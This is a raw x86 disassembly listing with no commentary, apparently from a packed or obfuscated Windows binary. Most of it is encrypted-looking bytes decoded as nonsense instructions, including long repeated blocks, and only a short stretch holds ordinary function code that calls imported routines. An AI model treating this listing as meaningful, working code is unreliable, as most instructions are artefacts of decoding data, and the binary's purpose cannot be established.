  422b3f:	mov    al,ds:0x2533bc96
  422b44:	enter  0xd1ed,0xef
  422b48:	jo     0x422acf
  422b4a:	mov    ecx,0x3dfcb724
  422b4f:	cmp    al,0x0
  422b51:	repnz mov edi,0x75da7178
  422b57:	sub    bl,BYTE PTR [edi-0x27]
  422b5a:	cld    
  422b5b:	mov    bl,0x3e
  422b5d:	cmp    DWORD PTR [esi],eax
  422b5f:	into   
  422b60:	jecxz  0x422b77
  422b62:	je     0x422bd7
  422b64:	and    dh,BYTE PTR [edi-0x5d]
  422b67:	rcl    edx,0xad
  422b6a:	scas   al,BYTE PTR es:[edi]
  422b6b:	sbb    eax,0x8481ee31
  422b70:	mov    esi,0x34a2fe4c
  422b75:	or     dh,BYTE PTR [esp+ecx*4-0x74]
  422b79:	in     eax,dx
  422b7a:	lea    edx,[esi]
  422b7c:	loope  0x422b76
  422b7e:	test   BYTE PTR [edx-0x1d],dl
  422b81:	ret    
  422b82:	pop    es
  422b83:	popf   
  422b84:	pop    edx
  422b85:	lock inc edi
  422b87:	je     0x422b3a
  422b89:	cmp    BYTE PTR [edx+0x42],ah
  422b8c:	popf   
  422b8d:	shl    BYTE PTR [ebp+0x7e],1
  422b90:	dec    edi
  422b91:	mov    ch,0x5e
  422b93:	cmp    ebx,0x35cb0bfc
  422b99:	addr16 setbe bl
  422b9d:	mov    al,ds:0x5721dfc3
  422ba2:	and    bl,dh
  422ba4:	xor    al,0xa4
  422ba6:	push   ecx
  422ba7:	ss pushf 
  422ba9:	call   FWORD PTR [ebp-0x1a9ed15a]
  422baf:	shrd   DWORD PTR [ebx],esi,0xe2
  422bb3:	lds    edi,FWORD PTR [eax+0x16]
  422bb6:	jl     0x422bb8
  422bb8:	adc    DWORD PTR [edi+0x2a],esp
  422bbb:	call   DWORD PTR [edi]
  422bbd:	inc    eax
  422bbe:	jns    0x422c1f
  422bc0:	sar    BYTE PTR [ebp+0x45],1
  422bc3:	div    DWORD PTR [eax+0x73]
  422bc6:	adc    bh,BYTE PTR [edi+0x7f]
  422bc9:	int3   
  422bca:	mov    ds:0xb07904ab,eax
  422bcf:	mov    bh,0x75
  422bd1:	or     eax,0xb577ed5d
  422bd6:	test   al,0xf4
  422bd8:	sbb    eax,0x2eb2c9e8
  422bdd:	push   0xffffffd1
  422bdf:	jecxz  0x422be9
  422be1:	outs   dx,DWORD PTR ds:[esi]
  422be2:	test   al,0x86
  422be4:	ret    
  422be5:	jecxz  0x422bb8
  422be7:	mov    edx,0x316f81cd
  422bec:	pop    ebp
  422bed:	inc    ebp
  422bee:	xchg   esp,eax
  422bef:	fcomip st,st(6)
  422bf1:	pop    ebx
  422bf2:	jmp    0x2e784163
  422bf7:	mov    dh,0xe8
  422bf9:	rol    DWORD PTR [ebx-0x55],1
  422bfc:	xor    al,0xa0
  422bfe:	stc    
  422bff:	cmp    al,0x1f
  422c01:	dec    ebp
  422c02:	int3   
  422c03:	ret    
  422c04:	nop
  422c05:	out    0xdc,eax
  422c07:	call   0x96be:0x6e5e1e2e
  422c0e:	xchg   edi,eax
  422c0f:	retf   0xcd97
  422c12:	jmp    0x6bc8:0x41628971
  422c19:	inc    edi
  422c1a:	and    bl,BYTE PTR [ecx]
  422c1c:	add    eax,0xc7bc1020
  422c21:	sub    edi,esi
  422c23:	or     ch,bh
  422c25:	scas   eax,DWORD PTR es:[edi]
  422c26:	jge    0x422bbd
  422c28:	xchg   edi,eax
  422c29:	outs   dx,BYTE PTR ds:[esi]
  422c2a:	add    esi,edx
  422c2c:	ret    
  422c2d:	pop    ecx
  422c2e:	xchg   ecx,eax
  422c2f:	js     0x422c84
  422c31:	add    cl,cl
  422c33:	mov    esp,esi
  422c35:	xor    ebp,DWORD PTR [edx]
  422c37:	je     0x422c40
  422c39:	pop    ss
  422c3a:	dec    ebp
  422c3b:	neg    BYTE PTR [edx-0x3d]
  422c3e:	int3   
  422c3f:	test   al,0xcf
  422c41:	inc    esi
  422c42:	(bad)  
  422c43:	shl    BYTE PTR [esi],1
  422c45:	fild   QWORD PTR [ebx-0x2839dde5]
  422c4b:	xchg   edi,eax
  422c4c:	adc    al,0x9a
  422c4e:	inc    esp
  422c4f:	mov    al,0xa4
  422c51:	add    edi,0xffffff9c
  422c54:	outs   dx,DWORD PTR ds:[esi]
  422c55:	sub    eax,0x2b6f47c0
  422c5a:	sub    al,0x3c
  422c5c:	fwait
  422c5d:	mov    al,0xd
  422c5f:	xchg   BYTE PTR [ebp-0x4dc61d9],al
  422c65:	ret    0xc538
  422c68:	adc    BYTE PTR [ebp-0x26],dl
  422c6b:	(bad)  [eax]
  422c6d:	jns    0x422c76
  422c6f:	popa   
  422c70:	and    DWORD PTR [ebx+0x64],esp
  422c73:	ins    DWORD PTR es:[edi],dx
  422c74:	mov    dl,BYTE PTR [edx+0x44b3fd4e]
  422c7a:	aad    0x26
  422c7c:	push   eax
  422c7d:	or     ch,BYTE PTR [ebp-0x72]
  422c80:	sub    ah,dl
  422c82:	and    al,0xed
  422c84:	mov    ch,0x8f
  422c86:	xor    bh,BYTE PTR [ebp+0x372f3a34]
  422c8c:	jne    0x422cea
  422c8e:	sbb    dl,cl
  422c90:	or     DWORD PTR [esi-0x1],edx
  422c93:	es jmp 0x422ce4
  422c96:	pop    ebx
  422c97:	and    BYTE PTR [esi-0x27],al
  422c9a:	push   0x5b632c61
  422c9f:	xchg   esi,eax
  422ca0:	cmp    BYTE PTR [ebp+0x51],ah
  422ca3:	loopne 0x422cad
  422ca5:	into   
  422ca6:	push   cs
  422ca7:	cdq    
  422ca8:	inc    ecx
  422ca9:	jmp    0xa25f:0x25f5e960
  422cb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cb1:	ficomp DWORD PTR [eax+0x2e]
  422cb4:	fimul  DWORD PTR ds:[ecx-0x5c]
  422cb8:	push   ds
  422cb9:	daa    
  422cba:	sar    DWORD PTR [eax+0x841a656],cl
  422cc0:	je     0x422d3f
  422cc2:	lea    eax,[ecx]
  422cc4:	fdiv   QWORD PTR [esi-0x5d664634]
  422cca:	jecxz  0x422d13
  422ccc:	lea    edi,[ebp+0x7bf0d7c]
  422cd2:	mov    edi,0xcae8d6a6
  422cd7:	and    bl,BYTE PTR [edi]
  422cd9:	xchg   esi,eax
  422cda:	adc    BYTE PTR [edi+0xb],dl
  422cdd:	inc    esp
  422cde:	xchg   esi,eax
  422cdf:	dec    ecx
  422ce0:	inc    esp
  422ce1:	mov    cl,0x28
  422ce3:	jg     0x422cbe
  422ce5:	fdiv   QWORD PTR [esi+ebp*1+0x48]
  422ce9:	push   ecx
  422cea:	inc    edi
  422ceb:	stos   DWORD PTR es:[edi],eax
  422cec:	jmp    0x621f:0x4f4c2b86
  422cf3:	rcr    BYTE PTR [edi-0x6f],0x6f
  422cf7:	lods   al,BYTE PTR ds:[esi]
  422cf8:	mov    esp,0xe2699717
  422cfd:	inc    ecx
  422cfe:	and    BYTE PTR ds:0x940dafab,cl
  422d04:	pop    ss
  422d05:	cld    
  422d06:	adc    al,0xcd
  422d08:	pop    ds
  422d09:	or     dl,BYTE PTR [esi+0x5bb50f9b]
  422d0f:	nop
  422d10:	std    
  422d11:	dec    edi
  422d12:	in     al,0xbf
  422d14:	inc    eax
  422d15:	call   0x8757:0xcc3a2776
  422d1c:	sub    esp,DWORD PTR [edx]
  422d1e:	jns    0x422d98
  422d20:	in     al,dx
  422d21:	pop    edx
  422d22:	fsubr  QWORD PTR [edx]
  422d24:	push   esp
  422d25:	mov    eax,ds:0x32280e9e
  422d2a:	pusha  
  422d2b:	sahf   
  422d2c:	inc    edx
  422d2d:	out    dx,al
  422d2e:	xor    al,0x3f
  422d30:	jecxz  0x422d02
  422d32:	sahf   
  422d33:	jbe    0x422d3f
  422d35:	outs   dx,BYTE PTR ds:[esi]
  422d36:	cmp    eax,0x329ad746
  422d3b:	test   esp,0xab9c19cd
  422d41:	dec    edx
  422d42:	xchg   esi,eax
  422d43:	push   ecx
  422d44:	loopne 0x422d75
  422d46:	mov    bl,0xf1
  422d48:	add    al,0xe1
  422d4a:	das    
  422d4b:	in     eax,dx
  422d4c:	xchg   ebx,eax
  422d4d:	pushf  
  422d4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d4f:	mov    ah,0xca
  422d51:	cmp    eax,0xc69ef955
  422d56:	mov    ebx,DWORD PTR [ecx-0x5aa8ead6]
  422d5c:	(bad)  
  422d5d:	scas   eax,DWORD PTR es:[edi]
  422d5e:	mov    ebp,0xae39ae9b
  422d63:	xor    eax,0x8f80e2fd
  422d68:	xchg   edx,eax
  422d69:	lahf   
  422d6a:	cs jl  0x422d55
  422d6d:	lods   al,BYTE PTR ds:[esi]
  422d6e:	add    dl,al
  422d70:	in     al,dx
  422d71:	ja     0x422d63
  422d73:	test   BYTE PTR [edx+edi*4-0x1c],bl
  422d77:	jnp    0x422de2
  422d79:	jo     0x422dd0
  422d7b:	dec    ebx
  422d7c:	mov    ss,ebx
  422d7e:	repz sbb bl,0xe0
  422d82:	mov    ch,0xba
  422d84:	and    al,0x7
  422d86:	call   0x1745:0x24e76734
  422d8d:	gs fdivrp st(3),st
  422d90:	push   ds
  422d91:	inc    esp
  422d92:	or     al,0x2d
  422d94:	pop    eax
  422d95:	loopne 0x422d25
  422d97:	jae    0x422d27
  422d99:	out    0xef,eax
  422d9b:	inc    ebx
  422d9c:	push   edi
  422d9e:	in     al,dx
  422d9f:	inc    ecx
  422da0:	js     0x422daa
  422da2:	and    BYTE PTR [edx-0x3504c258],dh
  422da8:	xchg   ecx,eax
  422da9:	mov    BYTE PTR [ebx],0x54
  422dac:	(bad)  
  422dad:	std    
  422dae:	call   0xb1f9b097
  422db3:	mov    bh,0x8f
  422db5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422db6:	jno    0x422dc7
  422db8:	pusha  
  422db9:	inc    ebx
  422dba:	mov    ds:0x45660ef9,al
  422dbf:	outs   dx,DWORD PTR ds:[esi]
  422dc0:	add    al,0xed
  422dc2:	sub    bl,BYTE PTR [esi-0x37]
  422dc5:	cmp    BYTE PTR [ebx-0x7f],ch
  422dc8:	or     esi,DWORD PTR [esi]
  422dca:	mov    eax,0xebb9872e
  422dcf:	push   0x407dac4f
  422dd4:	shl    DWORD PTR [edx+eax*2],1
  422dd7:	or     al,0x67
  422dd9:	jne    0x422da9
  422ddb:	cmp    ah,al
  422ddd:	dec    esp
  422dde:	test   ecx,edx
  422de0:	pop    edx
  422de1:	retf   
  422de2:	lds    sp,DWORD PTR [ebx+0x5f5b97a7]
  422de9:	imul   esi,DWORD PTR [ebp-0x34d75e7a],0x9fd33530
  422df3:	rcl    BYTE PTR [edi],cl
  422df5:	sbb    al,0x7
  422df7:	loopne 0x422dcf
  422df9:	test   DWORD PTR [edi+0x58],ebp
  422dfc:	aas    
  422dfd:	ins    BYTE PTR es:[edi],dx
  422dfe:	or     DWORD PTR ds:0xaea43229,esp
  422e04:	dec    edi
  422e05:	push   esp
  422e06:	jns    0x422e2f
  422e08:	jno    0x422e2d
  422e0a:	in     al,dx
  422e0b:	outs   dx,DWORD PTR ds:[esi]
  422e0c:	fnstcw WORD PTR [bx+si]
  422e0f:	adc    al,0xde
  422e11:	les    edi,FWORD PTR [esi]
  422e13:	popa   
  422e14:	out    dx,eax
  422e15:	loopne 0x422e32
  422e17:	sbb    ebx,DWORD PTR [edx-0x225b4e60]
  422e1d:	imul   BYTE PTR [edi+0x57]
  422e20:	popa   
  422e21:	icebp  
  422e22:	hlt    
  422e23:	inc    esi
  422e24:	mov    eax,0xebc758b9
  422e29:	and    BYTE PTR [edx+0x65],al
  422e2c:	and    eax,DWORD PTR [ecx]
  422e2e:	in     al,dx
  422e2f:	mov    ebp,0x7485e01b
  422e34:	test   al,0x6e
  422e36:	jmp    0xa732:0xd1c68889
  422e3d:	ret    
  422e3e:	jmp    0x2b89:0x7a8d5f4c
  422e45:	std    
  422e46:	clc    
  422e47:	cvttps2pi mm2,QWORD PTR [ebp+0x20]
  422e4b:	lea    ebx,[edi-0x59360316]
  422e51:	cmp    eax,0xc0a1bcb4
  422e56:	mov    edx,0xaef969d8
  422e5b:	das    
  422e5c:	imul   esi,DWORD PTR [edi-0x4f],0xffffffec
  422e60:	in     eax,0x3
  422e62:	or     BYTE PTR [edi],al
  422e64:	aad    0xf1
  422e66:	push   0x660ff29d
  422e6b:	les    ebx,FWORD PTR [esi]
  422e6d:	imul   esi,DWORD PTR [ebx-0x2e216dfa],0x76
  422e74:	hlt    
  422e75:	aaa    
  422e76:	iret   
  422e77:	sub    bl,BYTE PTR [edx-0x7408a4a5]
  422e7d:	push   edi
  422e7e:	jle    0x422e74
  422e80:	push   cs
  422e81:	add    eax,0x5e9ef085
  422e86:	lea    esp,[edx-0x7]
  422e89:	repnz in al,0xc0
  422e8c:	sbb    DWORD PTR [ebp*1-0x6a590e6e],0x2
  422e94:	rcl    DWORD PTR [eax],0xe0
  422e97:	or     ebp,ebp
  422e99:	sbb    al,0xc9
  422e9b:	and    eax,0x45459731
  422ea0:	test   DWORD PTR [edx-0x6a],edx
  422ea3:	mov    dh,0x8b
  422ea5:	loope  0x422e54
  422ea7:	ins    DWORD PTR es:[edi],dx
  422ea8:	xor    esp,DWORD PTR [esi+0x2f90752a]
  422eae:	scas   eax,DWORD PTR es:[edi]
  422eaf:	hlt    
  422eb0:	je     0x422ef0
  422eb2:	push   0x59
  422eb4:	imul   ecx,edi,0xffffffa5
  422eb7:	push   edx
  422eb8:	add    eax,0x14b86fd6
  422ebe:	ret    0x4850
  422ec1:	mov    ?,WORD PTR fs:[edx-0x341ab69]
  422ec8:	inc    ebx
  422ec9:	jge    0x422eda
  422ecb:	nop
  422ecc:	sbb    eax,0xbe91447a
  422ed1:	in     eax,dx
  422ed2:	xor    eax,0x11a38a7e
  422ed7:	adc    DWORD PTR [ebx+0x337195bc],ebp
  422edd:	xor    esp,DWORD PTR [edx-0xa]
  422ee0:	vpsrlw xmm3,xmm1,XMMWORD PTR [esi]
  422ee4:	sbb    BYTE PTR [ecx+0x2],0x23
  422ee8:	mov    ds,WORD PTR [ebp-0x6f7a5ca4]
  422eee:	add    eax,0xea394699
  422ef3:	adc    eax,0x9bd10dea
  422ef8:	sbb    edx,esp
  422efa:	shr    BYTE PTR [ecx+0x6f],0xe8
  422efe:	jg     0x422eea
  422f00:	mov    eax,ds:0xf323c0eb
  422f05:	in     eax,dx
  422f06:	cmp    cl,al
  422f08:	in     al,dx
  422f09:	xchg   edx,eax
  422f0a:	aas    
  422f0b:	retf   
  422f0c:	arpl   si,bx
  422f0e:	loope  0x422e90
  422f10:	loope  0x422f89
  422f12:	out    dx,eax
  422f13:	dec    edi
  422f14:	or     eax,edi
  422f16:	mov    al,0xbf
  422f18:	xchg   edx,eax
  422f19:	ja     0x422eeb
  422f1b:	dec    eax
  422f1c:	mov    eax,0x735daff2
  422f21:	ins    DWORD PTR es:[edi],dx
  422f22:	sub    eax,0x6c183a66
  422f27:	xchg   edx,eax
  422f28:	dec    edi
  422f29:	mov    eax,0x1
  422f2e:	mov    esp,ebp
  422f30:	pop    ebp
  422f31:	ret    
  422f32:	int3   
  422f33:	int3   
  422f34:	int3   
  422f35:	int3   
  422f36:	int3   
  422f37:	int3   
  422f38:	int3   
  422f39:	int3   
  422f3a:	int3   
  422f3b:	int3   
  422f3c:	int3   
  422f3d:	int3   
  422f3e:	int3   
  422f3f:	int3   
  422f40:	push   ebp
  422f41:	mov    ebp,esp
  422f43:	sub    esp,0x8
  422f46:	mov    eax,ds:0x429028
  422f4b:	push   esi
  422f4c:	push   0x0
  422f4e:	push   0x4e
  422f50:	push   0x1e
  422f52:	push   0x0
  422f54:	push   0xffffffff
  422f56:	mov    DWORD PTR [ebp-0x4],0x0
  422f5d:	mov    DWORD PTR [ebp-0x8],eax
  422f60:	call   DWORD PTR ds:0x429038
  422f66:	mov    esi,DWORD PTR [ebp-0x8]
  422f69:	call   esi
  422f6b:	mov    DWORD PTR [ebp-0x4],eax
  422f6e:	cmp    DWORD PTR [ebp-0x4],0x57
  422f72:	jne    0x422f81
  422f74:	push   0x1cf74b3
  422f79:	call   0x4111f0
  422f7e:	add    esp,0x4
  422f81:	xor    eax,eax
  422f83:	pop    esi
  422f84:	mov    esp,ebp
  422f86:	pop    ebp
  422f87:	ret    
  422f88:	nop
  422f89:	nop
  422f8a:	nop
  422f8b:	nop
  422f8c:	nop
  422f8d:	nop
  422f8e:	nop
  422f8f:	nop
  422f90:	sub    esp,0x10
  422f93:	push   0x0
  422f95:	push   0x0
  422f97:	push   0x0
  422f99:	call   DWORD PTR ds:0x429034
  422f9f:	lea    eax,[esp+0x0]
  422fa3:	push   eax
  422fa4:	call   DWORD PTR ds:0x42903c
  422faa:	cmp    WORD PTR [esp+0x0],0x0
  422fb0:	je     0x422fd2
  422fb2:	push   0x0
  422fb4:	call   0x422f40
  422fb9:	add    esp,0x4
  422fbc:	call   0x411000
  422fc1:	push   0x0
  422fc3:	push   0x0
  422fc5:	call   0x424410
  422fca:	xor    eax,eax
  422fcc:	add    esp,0x10
  422fcf:	ret    0x10
  422fd2:	call   DWORD PTR [ebx+0x6b0e3451]
  422fd8:	mov    ch,0xb1
  422fda:	push   ebp
  422fdb:	mov    edi,0xc101a0e3
  422fe0:	and    DWORD PTR [ebx],ecx
  422fe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fe3:	mov    dh,0x68
  422fe5:	mov    ch,0xb1
  422fe7:	push   ebp
  422fe8:	mov    ebx,0x3e41a0e3
  422fed:	fimul  WORD PTR [ebx]
  422fef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ff0:	push   cs
  422ff1:	push   0xbb55b1b5
  422ff6:	jecxz  0x422f98
  422ff8:	add    DWORD PTR [esi],edi
  422ffa:	fimul  WORD PTR [ebx]
  422ffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ffd:	push   cs
  422ffe:	push   0xbb55b1b5
  423003:	jecxz  0x422fa5
  423005:	add    DWORD PTR [esi],edi
  423007:	fimul  WORD PTR [ebx]
  423009:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42300a:	push   cs
  42300b:	push   0x4355b1b5
  423010:	jecxz  0x422fb2
  423012:	add    DWORD PTR [eax],esi
  423014:	shl    DWORD PTR [ecx-0x4323f156],0x7c
  42301b:	je     0x423020
  42301d:	loop   0x42300b
  42301f:	int3   
  423020:	pop    ds
  423021:	mov    ah,BYTE PTR [ebx-0x33]
  423024:	jge    0x42306e
  423026:	(bad)
  423029:	fcom   QWORD PTR [ecx-0x42e1933f]
  42302f:	push   0xffffffca
  423031:	pusha  
  423032:	pop    es
  423033:	rcl    DWORD PTR [ecx-0x2d3c21c9],0x74
  42303a:	push   eax
  42303b:	(bad)  
  42303c:	(bad)  
  42303d:	retf   0x2c2e
  423040:	cli    
  423041:	loop   0x4230b8
  423043:	(bad)  
  423044:	mov    esp,es
  423046:	fs adc bl,dl
  423049:	push   es
  42304a:	scas   al,BYTE PTR es:[edi]
  42304b:	sub    ch,BYTE PTR [eax-0x4b]
  42304e:	mov    cl,0x55
  423050:	mov    ebx,0xa706a0e3
  423055:	and    dl,BYTE PTR [edx-0x19]
  423058:	idiv   dl
  42305a:	mov    edi,0xe929adf2
  42305f:	jecxz  0x42305a
  423061:	lods   al,BYTE PTR ds:[esi]
  423062:	aam    0x53
  423064:	rol    DWORD PTR [edx],0x62
  423067:	jmp    0x39c5:0xbbb1c749
  42306e:	xor    al,0x1c
  423070:	repz ss add al,0x30
  423074:	ror    BYTE PTR [eax+0x321bd35f],1
  42307a:	or     edx,DWORD PTR [edx]
  42307c:	push   eax
  42307d:	xor    ch,BYTE PTR [esi-0x44d86fb8]
  423083:	pop    ds
  423084:	cmp    esi,edx
  423086:	stos   BYTE PTR es:[edi],al
  423087:	dec    ebx
  423088:	(bad)  
  423089:	dec    esp
  42308a:	add    esi,ebp
  42308c:	mov    gs,WORD PTR [ecx-0x41]
  42308f:	jmp    0xe42b5a41
  423094:	stc    
  423095:	lods   eax,DWORD PTR ds:[esi]
  423096:	aam    0x23
  423098:	pop    ebp
  423099:	pushf  
  42309a:	bound  ecx,QWORD PTR [edx]
  42309c:	imul   edx,ebp,0x9358aeb1
  4230a2:	xor    al,0x86
  4230a4:	outs   dx,BYTE PTR ds:[esi]
  4230a5:	cdq    
  4230a6:	add    al,0x60
  4230a8:	dec    ebp
  4230a9:	and    ebx,DWORD PTR [edi-0x1d]
  4230ac:	xchg   BYTE PTR [eax-0x66d983f5],ch
  4230b2:	scas   al,BYTE PTR es:[edi]
  4230b3:	push   esi
  4230b4:	or     eax,0x4317bbba
  4230b9:	jno    0x423065
  4230bb:	push   ebx
  4230bc:	push   edi
  4230bd:	mov    ebp,0xfaf6e763
  4230c2:	mov    edi,0xe3bb55b1
  4230c7:	mov    al,ds:0x5bde3e01
  4230cc:	loope  0x4230dc
  4230ce:	push   0xbb57b0f9
  4230d3:	cmovae ebx,DWORD PTR [esi+0x71]
  4230d7:	fimul  WORD PTR [ebx]
  4230d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230da:	push   cs
  4230db:	push   0x5b55b1b5
  4230e0:	jecxz  0x423085
  4230e2:	add    BYTE PTR ds:0xea401df,dh
  4230e8:	test   BYTE PTR [ecx-0x1a40aa4f],dh
  4230ee:	mov    al,ds:0xbde3e01
  4230f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230f4:	mov    bl,0x68
  4230f6:	mov    ch,0xb1
  4230f8:	inc    ebp
  4230f9:	mov    ebx,0x3b01a0e3
  4230fe:	fimul  WORD PTR [ebx]
  423100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423101:	dec    edi
  423102:	push   0xbb55a1b5
  423107:	jecxz  0x4230ab
  423109:	add    DWORD PTR [esi],edi
  42310b:	fisttp DWORD PTR [ebx]
  42310d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42310e:	push   cs
  42310f:	push   0xbe55b1b5
  423114:	jecxz  0x4230b7
  423116:	add    DWORD PTR [esi],edi
  423118:	fimul  WORD PTR [ebx]
  42311a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42311b:	push   cs
  42311c:	call   0xbf97e2df
  423121:	jecxz  0x4230c3
  423123:	mov    esp,0xa60bdb0f
  423128:	push   cs
  423129:	push   0xab55b135
  42312e:	jecxz  0x4230d0
  423130:	adc    DWORD PTR [esi],edi
  423132:	fimul  WORD PTR [ebx]
  423134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423135:	push   ds
  423136:	push   0xbb55a1b5
  42313b:	jecxz  0x4230dd
  42313d:	add    DWORD PTR [esi],edi
  42313f:	into   
  423140:	or     esp,DWORD PTR [esi+ecx*1+0x55b1b568]
  423147:	mov    ebx,0xba01a0e3
  42314c:	mov    al,0x0
  42314e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42314f:	imul   esi,DWORD PTR [di+0x55b1],0xffffff8b
  423155:	call   0xde45fffa
  42315a:	or     esp,DWORD PTR [esi+ecx*1+0x55b1b568]
  423161:	mov    ebx,0x3e01a0e3
  423166:	fimul  WORD PTR [ebx]
  423168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423169:	push   cs
  42316a:	push   0xbb55b1b5
  42316f:	jecxz  0x423111
  423171:	add    DWORD PTR [esi],edi
  423173:	fimul  WORD PTR [ebx]
  423175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423176:	push   cs
  423177:	push   0xbb55b1b5
  42317c:	jecxz  0x42311e
  42317e:	add    DWORD PTR [esi],edi
  423180:	fimul  WORD PTR [ebx]
  423182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423183:	push   cs
  423184:	push   0xbb55b1b5
  423189:	jecxz  0x42312b
  42318b:	add    DWORD PTR [esi],edi
  42318d:	fimul  WORD PTR [ebx]
  42318f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423190:	push   cs
  423191:	push   0xbb55b1b5
  423196:	jecxz  0x423138
  423198:	add    DWORD PTR [esi],edi
  42319a:	fimul  WORD PTR [ebx]
  42319c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42319d:	push   cs
  42319e:	push   0xbb55b1b5
  4231a3:	jecxz  0x423145
  4231a5:	add    DWORD PTR [esi],edi
  4231a7:	fimul  WORD PTR [ebx]
  4231a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231aa:	push   cs
  4231ab:	push   0xbb55b1b5
  4231b0:	jecxz  0x423152
  4231b2:	add    DWORD PTR [esi],edi
  4231b4:	fimul  WORD PTR [ebx]
  4231b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231b7:	push   cs
  4231b8:	push   0xbb55b1b5
  4231bd:	jecxz  0x42315f
  4231bf:	add    DWORD PTR [esi],edi
  4231c1:	fimul  WORD PTR [ebx]
  4231c3:	mov    bh,BYTE PTR [edx+0xd]
  4231c6:	int    0xc5
  4231c8:	push   ebp
  4231c9:	mov    ebx,0x3521a0e3
  4231ce:	fimul  WORD PTR [ebx]
  4231d0:	mov    ah,0xe
  4231d2:	push   0xbb518bb5
  4231d7:	jecxz  0x42317d
  4231d9:	add    DWORD PTR [esi],edi
  4231db:	mov    cs,WORD PTR [esi-0x19]
  4231de:	cmp    al,0x3c
  4231e0:	cli    
  4231e1:	mov    cl,0x55
  4231e3:	mov    ebx,0x1e01a0e3
  4231e8:	fimul  WORD PTR [ebx]
  4231ea:	inc    esp
  4231eb:	and    BYTE PTR [edx],bl
  4231ed:	mov    bl,0x36
  4231f0:	mov    ebx,0x6e01a0e3
  4231f5:	fimul  WORD PTR [ebx]
  4231f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231f8:	arpl   WORD PTR ds:[ebp-0x1c44fa4f],si
  4231ff:	mov    al,ds:0xbde3a3f
  423204:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423205:	push   cs
  423206:	push   0xbb55b1b5
  42320b:	jecxz  0x4231ad
  42320d:	add    DWORD PTR [esi],edi
  42320f:	dec    BYTE PTR [ebx]
  423211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423212:	out    dx,al
  423213:	push   0xbb55b1b5
  423218:	jecxz  0x4231ba
  42321a:	add    DWORD PTR [esi],edi
  42321c:	fimul  WORD PTR [ebx]
  42321e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42321f:	push   cs
  423220:	push   0xbb55b1b5
  423225:	jecxz  0x4231c7
  423227:	add    DWORD PTR [esi],edi
  423229:	fimul  WORD PTR [ebx]
  42322b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42322c:	push   cs
  42322d:	push   0xbb55b1b5
  423232:	jecxz  0x4231d4
  423234:	add    DWORD PTR [esi],edi
  423236:	fimul  WORD PTR [ebx]
  423238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423239:	push   cs
  42323a:	push   0xbb55b1b5
  42323f:	jecxz  0x4231e1
  423241:	add    DWORD PTR [esi],edi
  423243:	fimul  WORD PTR [ebx]
  423245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423246:	push   cs
  423247:	push   0xbb55b1b5
  42324c:	jecxz  0x4231ee
  42324e:	add    DWORD PTR [esi],edi
  423250:	fimul  WORD PTR [ebx]
  423252:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423253:	push   cs
  423254:	push   0xbb55b1b5
  423259:	jecxz  0x4231fb
  42325b:	add    DWORD PTR [esi],edi
  42325d:	fimul  WORD PTR [ebx]
  42325f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423260:	push   cs
  423261:	push   0xbb55b1b5
  423266:	jecxz  0x423208
  423268:	add    DWORD PTR [esi],edi
  42326a:	fimul  WORD PTR [ebx]
  42326c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42326d:	push   cs
  42326e:	push   0xbb55b1b5
  423273:	jecxz  0x423215
  423275:	add    DWORD PTR [esi],edi
  423277:	fimul  WORD PTR [ebx]
  423279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42327a:	push   cs
  42327b:	push   0xbb55b1b5
  423280:	jecxz  0x423222
  423282:	add    DWORD PTR [esi],edi
  423284:	fimul  WORD PTR [ebx]
  423286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423287:	push   cs
  423288:	push   0xbb55b1b5
  42328d:	jecxz  0x42322f
  42328f:	add    DWORD PTR [esi],edi
  423291:	fimul  WORD PTR [ebx]
  423293:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423294:	push   cs
  423295:	push   0xbb55b1b5
  42329a:	jecxz  0x42323c
  42329c:	add    DWORD PTR [esi],edi
  42329e:	fimul  WORD PTR [ebx]
  4232a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232a1:	push   cs
  4232a2:	push   0xbb55b1b5
  4232a7:	jecxz  0x423249
  4232a9:	add    DWORD PTR [esi],edi
  4232ab:	fimul  WORD PTR [ebx]
  4232ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232ae:	push   cs
  4232af:	push   0xbb55b1b5
  4232b4:	jecxz  0x423256
  4232b6:	add    DWORD PTR [esi],edi
  4232b8:	fimul  WORD PTR [ebx]
  4232ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232bb:	push   cs
  4232bc:	push   0xbb55b1b5
  4232c1:	jecxz  0x423263
  4232c3:	add    DWORD PTR [esi],edi
